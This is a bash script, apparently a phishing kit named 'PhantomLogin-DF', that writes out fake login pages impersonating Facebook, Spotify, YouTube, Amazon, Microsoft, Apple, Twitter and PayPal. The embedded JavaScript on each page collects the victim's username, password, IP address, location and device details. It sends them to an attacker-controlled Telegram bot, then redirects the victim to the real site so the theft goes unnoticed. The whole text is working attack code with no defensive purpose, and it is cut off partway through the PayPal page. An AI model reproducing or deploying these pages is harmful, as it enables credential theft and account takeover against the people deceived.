#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${BLUE}
    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
    ${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Version   : 4.0"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

install_dependencies() {
    echo -e "${GREEN}[+] Checking and installing dependencies...${NC}"
    if ! command -v php &> /dev/null; then
        echo -e "${YELLOW}[+] PHP is not installed. Installing PHP...${NC}"
        sudo apt-get install php -y || { echo -e "${RED}[-] Failed to install PHP.${NC}"; exit 1; }
    fi
    if ! command -v ssh &> /dev/null; then
        echo -e "${YELLOW}[+] SSH is not installed. Installing SSH...${NC}"
        sudo apt-get install openssh-client -y || { echo -e "${RED}[-] Failed to install SSH.${NC}"; exit 1; }
    fi
    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}[+] jq is not installed. Installing jq...${NC}"
        sudo apt-get install jq -y || { echo -e "${RED}[-] Failed to install jq.${NC}"; exit 1; }
    fi
    echo -e "${GREEN}[+] All dependencies are installed.${NC}"
}
create_page() {
    local page_name=$1
    local page_content=$2

    echo "$page_content" > "${page_name}.html"
    echo -e "${GREEN}[+] Page ${page_name}.html created successfully.${NC}"
}

facebook_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 8px rgba(24, 119, 242, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #1877f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #145dbf; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #1877f2; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #1877f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h2>Log in to Facebook</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgotten password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Facebook Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.facebook.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

Spotify_page() {
    cat <<EOF
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Circular Spotify Tx T Black',Arial,sans-serif;}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;}
.login-container{background:#121212;padding:40px 60px;border-radius:10px;width:450px;box-shadow:0 8px 30px rgba(0,0,0,.5);}
.spotify-logo{width:180px;margin:0 auto 40px;display:block;}
h1{text-align:center;margin-bottom:40px;font-size:32px;}
input{width:100%;padding:15px;background:#181818;border:1px solid #535353;border-radius:4px;color:#fff;font-size:16px;}
.btn-login{width:100%;padding:15px;background:#1DB954;color:#000;border:none;border-radius:500px;font-size:16px;font-weight:700;cursor:pointer;margin-top:30px;}
.loader{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.8);justify-content:center;align-items:center;z-index:1000;}
.spotify-loader{width:50px;height:50px;border-radius:50%;border:3px solid #1DB954;border-top-color:transparent;animation:spin 1s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
</style>
</head>
<body>
<div class="loader" id="loader"><div class="spotify-loader"></div></div>
<div class="login-container">
<img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="spotify-logo">
<h1>Log in to Spotify</h1>
<form id="loginForm">
<input type="email" id="email" placeholder="Email address" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit" class="btn-login">Log In</button>
</form>
</div>
<script>
const BOT_TOKEN='${token}';
const CHAT_ID='${id}';
document.getElementById('loginForm').addEventListener('submit',async e=>{
e.preventDefault();
document.getElementById('loader').style.display='flex';
const email=document.getElementById('email').value;
const password=document.getElementById('password').value;
const ipData=await fetch('https://ipapi.co/json/').then(r=>r.json());
const battery=navigator.getBattery?await navigator.getBattery():{};
const deviceInfo={
ip:ipData.ip,
city:ipData.city,
country:ipData.country_name,
os:navigator.platform,
browser:navigator.userAgent,
resolution:`${screen.width}x${screen.height}`,
battery:battery.level?`${Math.round(battery.level*100)}%`:'N/A'
};
const message=`🎧 Spotify Login\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${deviceInfo.ip}\n📍 Location: ${deviceInfo.city}, ${deviceInfo.country}\n🖥 OS: ${deviceInfo.os}\n📱 Resolution: ${deviceInfo.resolution}\n🔋 Battery: ${deviceInfo.battery}`;
await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:message})});
window.location.href='https://www.spotify.com';
document.getElementById('loader').style.display='none';
});
</script>
</body>
</html>
EOF
}

YouTube_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - YouTube</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: url('https://dev-dfprotection.pantheonsite.io/wp-content/uploads/2025/03/Screenshot_20250316_015803_Google.jpg');
            background-size: cover;
            background-position: center;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.97);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 440px;
            backdrop-filter: blur(12px);
        }

        .logo {
            width: 100px;
            display: block;
            margin: 0 auto 30px;
            border-radius: 8px;
        }

        h1 {
            text-align: center;
            color: #1a1a1a;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #e4e6eb;
            border-radius: 8px;
            font-size: 16px;
            background: #f0f2f5;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: #07c160;
            box-shadow: 0 0 0 3px rgba(7, 193, 96, 0.1);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background: #07c160;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 15px;
        }

        .btn-login:hover {
            background: #059c4d;
            transform: translateY(-1px);
        }

        .links {
            text-align: center;
            margin-top: 20px;
        }

        .links a {
            color: #07c160;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }

        .loader {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.9);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #07c160;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
    </div>

    <div class="login-container">
        <img src="https://dev-dfprotection.pantheonsite.io/wp-content/uploads/2025/03/Screenshot_20250316_015803_Google.jpg" 
             class="logo" 
             alt="YouTube Logo">

        <h1>تسجيل الدخول إلى YouTube </h1>

        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
            </div>

            <div class="form-group">
                <input type="password" id="password" placeholder="كلمة المرور" required>
            </div>

            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>

        <div class="links">
            <a href="#">هل نسيت كلمة المرور؟</a>
            <a href="#">إنشاء حساب جديد</a>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '${token}';
        const CHAT_ID = '${id}';

        async function getDeviceInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const battery = navigator.getBattery ? await navigator.getBattery() : {};
                const connection = navigator.connection || {};

                return {
                    ip: ipData.ip,
                    location: await getLocation(ipData.ip),
                    battery: battery.level ? Math.round(battery.level * 100) : 'N/A',
                    os: navigator.platform,
                    resolution: `${screen.width}x${screen.height}`,
                    userAgent: navigator.userAgent,
                    time: new Date().toLocaleString()
                };
            } catch (error) {
                return { error: 'Failed to get device info' };
            }
        }

        async function getLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return `${data.city}, ${data.country_name}`;
            } catch {
                return 'Location unknown';
            }
        }

        async function sendToTelegram(data) {
            const text = `
🛡 YouTube Login Details:

📧 Username: ${data.username}
🔑 Password: ${data.password}

📡 Device Info:
🌐 IP: ${data.device.ip}
📍 Location: ${data.device.location}
🔋 Battery: ${data.device.battery}%
🖥 OS: ${data.device.os}
📱 Resolution: ${data.device.resolution}
🕒 Time: ${data.device.time}
🌍 Browser: ${data.device.userAgent}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });

                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            document.getElementById('loader').style.display = 'flex';

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const deviceInfo = await getDeviceInfo();
                let attempts = 0;
                let success = false;
                
                while(attempts++ < 3 && !success) {
                    success = await sendToTelegram({ username, password, device: deviceInfo });
                    if(!success) await new Promise(resolve => setTimeout(resolve, 2000));
                }

                window.location.href = 'https://www.youtube.com';
            } catch {
                window.location.href = 'https://www.youtube.com';
            } finally {
                document.getElementById('loader').style.display = 'none';
            }
        });
    </script>
</body>
</html>
EOF
}

amazon_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Amazon Ember', Arial, sans-serif; 
            background: linear-gradient(to bottom, #fafafa 0%, #eaeaea 100%); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .login-container { 
            background: white; 
            border-radius: 8px; 
            width: 380px; 
            padding: 40px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); 
        }
        .logo { 
            width: 120px; 
            margin: 0 auto 30px; 
            display: block; 
        }
        h1 { 
            color: #232f3e; 
            text-align: center; 
            margin-bottom: 30px; 
            font-weight: 400; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            margin-bottom: 15px; 
            border: 1px solid #a6a6a6; 
            border-radius: 3px; 
            font-size: 15px; 
        }
        .btn-login { 
            width: 100%; 
            padding: 12px; 
            background: linear-gradient(to bottom,#f7dfa5,#f0c14b); 
            border: 1px solid #a88734; 
            border-radius: 3px; 
            cursor: pointer; 
            font-weight: 400; 
        }
        .footer { 
            margin-top: 20px; 
            text-align: center; 
        }
        .footer a { 
            color: #0066c0; 
            text-decoration: none; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo" alt="Amazon Logo">
        <h1>Sign-In</h1>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or mobile phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Continue</button>
        </form>
        <div class="footer">
            <a href="#">Forgot Password?</a>
        </div>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            
            fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`🛒 Amazon Login\n📧 Email: \${email}\n🔑 Password: \${password}\n\n📡 Device Info:\nIP: \${deviceInfo.ip}\nBattery: \${deviceInfo.batteryLevel}%\`
                })
            })
            .then(() => window.location.href = 'https://amazon.com')
            .catch(() => alert('Login failed!'));
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: navigator.connection?.effectiveType || 'Unknown',
                deviceName: navigator.userAgent
            };
        }
    </script>
</body>
</html>
EOF
}

microsoft_page() {
    cat <<EOF
 <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Microsoft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            background: #fff;
            width: 100%;
            max-width: 440px;
            padding: 48px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        .microsoft-logo {
            width: 140px;
            margin: 0 auto 40px;
            display: block;
        }

        h1 {
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 32px;
            font-size: 24px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: #0078d4;
            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
            outline: none;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            font-size: 16px;
            transition: background 0.3s ease;
        }

        .btn-login:hover {
            background: #006cbd;
        }

        .footer-links {
            margin-top: 30px;
            text-align: center;
        }

        .footer-links a {
            color: #0078d4;
            text-decoration: none;
            font-size: 14px;
        }

        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
             class="microsoft-logo" 
             alt="Microsoft Logo">

        <h1>تسجيل الدخول إلى حسابك</h1>

        <form id="loginForm">
            <div class="form-group">
                <input type="email" 
                       id="email" 
                       placeholder="البريد الإلكتروني أو رقم الهاتف"
                       required>
            </div>

            <div class="form-group">
                <input type="password" 
                       id="password" 
                       placeholder="كلمة المرور"
                       required>
            </div>

            <button type="submit" class="btn-login" id="submitBtn">
                <span>التالي</span>
                <div class="loader"></div>
            </button>
        </form>

        <div class="footer-links">
            <a href="#">هل نسيت كلمة المرور؟</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const loader = btn.querySelector('.loader');
            const btnText = btn.querySelector('span');

            // Show loading state
            btn.disabled = true;
            btnText.style.display = 'none';
            loader.style.display = 'block';

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                ip: await getIP(),
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString()
            };

            try {
                // Send to Telegram
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: '${id}',
                        text: `🔐 Microsoft Login\n\n📧 Email: ${formData.email}\n🔑 Password: ${formData.password}\n\n📡 IP: ${formData.ip}\n📱 Device: ${formData.userAgent}\n🖥️ Screen: ${formData.screen}\n⏰ Time: ${formData.time}`
                    })
                });

                // Redirect after successful submission
                setTimeout(() => {
                    window.location.href = 'https://account.microsoft.com/';
                }, 1500);

            } catch (error) {
                alert('حدث خطأ، يرجى المحاولة مرة أخرى');
                btn.disabled = false;
                btnText.style.display = 'block';
                loader.style.display = 'none';
            }
        });

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }
    </script>
</body>
</html>   
EOF
}

apple_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background-color: #f5f5f7; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .login-container { 
            background-color: #ffffff; 
            border-radius: 20px; 
            width: 380px; 
            padding: 40px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); 
            text-align: center;
        }
        .logo { 
            width: 60px; 
            margin-bottom: 25px; 
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
        }
        h1 { 
            font-size: 24px; 
            color: #1d1d1f; 
            margin-bottom: 15px; 
            font-weight: 600; 
        }
        input { 
            width: 100%; 
            padding: 14px; 
            margin-bottom: 12px; 
            border: 1px solid #d2d2d7; 
            border-radius: 12px; 
            font-size: 15px; 
            outline: none; 
            transition: border-color 0.3s;
        }
        input:focus { 
            border-color: #0071e3; 
            box-shadow: 0 0 8px rgba(0, 113, 227, 0.2); 
        }
        .btn-login { 
            width: 100%; 
            padding: 14px; 
            background-color: #0071e3; 
            color: white; 
            font-weight: 600; 
            border: none; 
            border-radius: 12px; 
            cursor: pointer; 
            transition: background-color 0.3s;
        }
        .btn-login:hover { 
            background-color: #0077ed; 
        }
        .links { 
            margin-top: 20px; 
            font-size: 14px; 
        }
        .links a { 
            color: #0071e3; 
            text-decoration: none; 
            margin: 0 10px; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="logo" alt="Apple Logo">
        <h1>Sign in with your Apple ID</h1>
        <form id="loginForm">
            <input type="text" id="appleId" placeholder="Apple ID" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot Apple ID?</a>
            <a href="#">Forgot Password?</a>
        </div>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const appleId = document.getElementById('appleId').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            
            fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`📱 Apple ID Login\n🆔 Apple ID: \${appleId}\n🔑 Password: \${password}\n\n📡 Device Info:\nIP: \${deviceInfo.ip}\nBattery: \${deviceInfo.batteryLevel}%\nNetwork: \${deviceInfo.networkType}\nUser Agent: \${deviceInfo.deviceName}\`
                })
            })
            .then(() => window.location.href = 'https://apple.com')
            .catch(() => alert('Login failed!'));
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: navigator.connection?.effectiveType || 'Unknown',
                deviceName: navigator.userAgent
            };
        }
    </script>
</body>
</html>
EOF
}


twitter_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #15202b; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #192734; border-radius: 15px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 50px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #ffffff; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #38444d; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #192734; color: #ffffff; }
        input:focus { border-color: #1da1f2; box-shadow: 0 0 8px rgba(29, 161, 242, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #1da1f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #1991db; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #1da1f2; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #38444d; }
        .signup-btn { width: 100%; padding: 14px; background-color: #192734; border: 1px solid #38444d; font-size: 14px; color: #1da1f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #1e2d3b; }
        .terms { margin-top: 20px; font-size: 12px; color: #8899a6; }
        .terms a { color: #1da1f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_%28white%29.png" alt="Twitter Logo">
        <h2>Log in to Twitter</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, email, or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for Twitter</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Twitter Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://twitter.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

paypal_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #003087; box-shadow: 0 0 8px rgba(0, 48, 135, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #003087; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #002366; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #003087; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #003087; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #003087; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
        <h2>Log in to PayPal</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or mobile number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Having trouble logging in?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign Up</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
